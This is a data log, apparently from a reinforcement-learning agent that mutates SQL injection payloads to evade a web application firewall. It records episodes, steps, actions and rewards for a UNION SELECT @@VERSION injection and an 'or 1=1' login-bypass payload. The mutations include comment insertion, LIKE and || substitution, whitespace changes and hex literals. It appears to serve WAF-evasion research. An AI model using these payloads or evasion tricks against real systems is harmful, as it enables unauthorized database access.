;episode;step;original_payload;state;action;next_state;reward;win
10;1;11;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";16;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.25454540186184715;0
11;1;12;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";11;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.7909090704169157;0
12;1;13;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";22;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.6909090704169156;0
13;1;14;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";2;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.5909090704169158;0
14;1;15;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";19;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.49090907041691567;0
15;1;16;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";16;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.3909090704169158;0
16;1;17;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";22;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.2909090704169157;0
17;1;18;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";4;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.19090907041691563;0
18;1;19;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";21;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.09090907041691576;0
19;1;20;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";4;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
20;1;21;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";15;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
21;1;22;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";22;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
22;1;23;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";16;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
23;1;24;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";16;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
24;1;25;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";2;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
25;1;26;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";21;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
26;1;27;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";16;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
27;1;28;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";21;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
28;1;29;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";17;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
29;1;30;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";11;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.0;0
30;2;1;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or 1 = 1 or """""""" = """"""";21;"""admin""""or 1 = 1 or """""""" = """"""";2.3999999284744287;0
31;2;2;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or 1 = 1 or """""""" = """"""";17;"""admin""""or 1 = 1 or """""""" = """"""";2.2999999284744286;0
32;2;3;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or 1 = 1 or """""""" = """"""";14;"""admin""""or#A3H45Ua
1#A3H45Ua
=#A3H45Ua
1#A3H45Ua
or#A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";8.400000032037498;0
33;2;4;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or#A3H45Ua
1#A3H45Ua
=#A3H45Ua
1#A3H45Ua
or#A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";8;"""admin""""or#A3H45Ua
(SELECT 1)#A3H45Ua
=#A3H45Ua
(SELECT 1)#A3H45Ua
or#A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.6714284196191986;0
34;2;5;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""or#A3H45Ua
(SELECT 1)#A3H45Ua
=#A3H45Ua
(SELECT 1)#A3H45Ua
or#A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";6;"""admin"""" || #A3H45Ua
(SELECT 1)#A3H45Ua
=#A3H45Ua
(SELECT 1)#A3H45Ua
 || #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.2999999798834327;0
35;2;6;"""admin""""or 1 = 1 or """""""" = """"""";"""admin"""" || #A3H45Ua
(SELECT 1)#A3H45Ua
=#A3H45Ua
(SELECT 1)#A3H45Ua
 || #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";25;"""admin"""" || #A3H45Ua
(SELECT 1)#A3H45Ua
=#A3H45Ua
(SELECT 1)#A3H45Ua
 || #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.1999999798834327;0
36;2;7;"""admin""""or 1 = 1 or """""""" = """"""";"""admin"""" || #A3H45Ua
(SELECT 1)#A3H45Ua
=#A3H45Ua
(SELECT 1)#A3H45Ua
 || #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";9;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";3.1999999716877943;0
37;2;8;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";21;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";3.099999971687794;0
38;2;9;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";1;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.999999971687794;0
39;2;10;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";1;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.8999999716877944;0
40;2;11;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";5;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.7999999716877944;0
41;2;12;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";22;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.6999999716877943;0
42;2;13;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";12;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2.492307658449433;0
43;2;14;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
=#A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
=#A3H45Ua
""""""";2;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
 LIKE #A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
 LIKE #A3H45Ua
""""""";1.1761903953660398;0
44;2;15;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
 LIKE #A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
 LIKE #A3H45Ua
""""""";20;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
 LIKE #A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
 LIKE #A3H45Ua
""""""";1.0761903953660397;0
45;2;16;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
 LIKE #A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
 LIKE #A3H45Ua
""""""";3;"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
 LIKE #A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
 LIKE #A3H45Ua
""""""";0.9761903953660398;0
46;2;17;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	 #A3H45Ua
(SELECT	 1)#A3H45Ua
 LIKE #A3H45Ua
(SELECT	 1)#A3H45Ua
	 ||	 #A3H45Ua
""""""""#A3H45Ua
 LIKE #A3H45Ua
""""""";24;"""admin""""	 ||	  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
	 ||	  OR 0#A3H45Ua
"""""""" OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
""""""";0.39999997019767797;0
47;2;18;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
	 ||	  OR 0#A3H45Ua
"""""""" OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
""""""";25;"""admin""""	 ||	  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
	 ||	  OR 0#A3H45Ua
"""""""" OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
""""""";0.2999999701976779;0
48;2;19;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
	 ||	  OR 0#A3H45Ua
"""""""" OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
""""""";25;"""admin""""	 ||	  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
	 ||	  OR 0#A3H45Ua
"""""""" OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
""""""";0.199999970197678;0
49;2;20;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	 ||	  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
(SELECT	 1) OR 0#A3H45Ua
	 ||	  OR 0#A3H45Ua
"""""""" OR 0#A3H45Ua
 LIKE  OR 0#A3H45Ua
""""""";0;"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
	/**/||	/**//**/OR/**/0#A3H45Ua
""""""""/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
""""""";0.0;0
50;2;21;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
	/**/||	/**//**/OR/**/0#A3H45Ua
""""""""/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
""""""";23;"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
	/**/||	/**//**/OR/**/0#A3H45Ua
""""""""/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
""""""";0.0;0
51;2;22;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
	/**/||	/**//**/OR/**/0#A3H45Ua
""""""""/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
""""""";17;"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
	/**/||	/**//**/OR/**/0#A3H45Ua
""""""""/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
""""""";0.0;0
52;2;23;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
(SELECT	/**/1)/**/OR/**/0#A3H45Ua
	/**/||	/**//**/OR/**/0#A3H45Ua
""""""""/**/OR/**/0#A3H45Ua
/**/LIKE/**//**/OR/**/0#A3H45Ua
""""""";7;"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
	/**/||	/**//**/OR/**/0x0#A3H45Ua
""""""""/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
""""""";0.06666661037339239;0
53;2;24;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
	/**/||	/**//**/OR/**/0x0#A3H45Ua
""""""""/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
""""""";18;"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
	/**/||	/**//**/OR/**/0x0#A3H45Ua
""""""""/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
""""""";0.0;0
54;2;25;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
	/**/||	/**//**/OR/**/0x0#A3H45Ua
""""""""/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
""""""";9;"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
	/**/||	/**//**/OR/**/0x0#A3H45Ua
""""""""/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
""""""";0.0;0
